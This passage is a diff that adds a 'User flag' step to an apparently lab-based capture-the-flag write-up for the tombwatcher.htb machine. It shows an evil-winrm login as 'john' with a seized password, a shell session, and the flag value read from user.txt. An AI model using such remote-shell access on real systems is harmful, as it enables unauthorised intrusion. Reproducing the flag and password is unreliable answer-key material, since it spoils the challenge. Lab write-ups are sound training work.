@@ -353,6 +353,67 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
 ```
 
+### User flag
+
+```
+ evil-winrm -i tombwatcher.htb -u john -p 'newP@ssword2022'   
+                                        
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                        
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                                                                                                   
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\john\Documents> dir
+*Evil-WinRM* PS C:\Users\john\Documents> tree \ .
+Too many parameters - .
+*Evil-WinRM* PS C:\Users\john\Documents> cd ,,
+At line:1 char:4
++ cd ,,
++    ~
+Missing argument in parameter list.
+
+At line:1 char:5
++ cd ,,
++     ~
+Missing argument in parameter list.
+    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
+    + FullyQualifiedErrorId : MissingArgument,Microsoft.PowerShell.Commands.InvokeExpressionCommand
+*Evil-WinRM* PS C:\Users\john\Documents> cd ..
+*Evil-WinRM* PS C:\Users\john> tree
+Folder PATH listing
+Volume serial number is EFB6-9D96
+C:.
+ÃÄÄÄDesktop
+ÃÄÄÄDocuments
+ÃÄÄÄDownloads
+ÃÄÄÄFavorites
+ÃÄÄÄLinks
+ÃÄÄÄMusic
+ÃÄÄÄPictures
+ÃÄÄÄSaved Games
+ÀÄÄÄVideos
+*Evil-WinRM* PS C:\Users\john> cd Desktop
+*Evil-WinRM* PS C:\Users\john\Desktop> dir
+
+
+    Directory: C:\Users\john\Desktop
+
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-ar---        9/24/2026   7:21 AM             34 user.txt
+
+
+*Evil-WinRM* PS C:\Users\john\Desktop> type user.txt
+b3438e9f759311d129b2b03ecaaa313f
+*Evil-WinRM* PS C:\Users\john\Desktop> 
+
+
+
+```
+
 ---
 ## Privilege Escalation
 
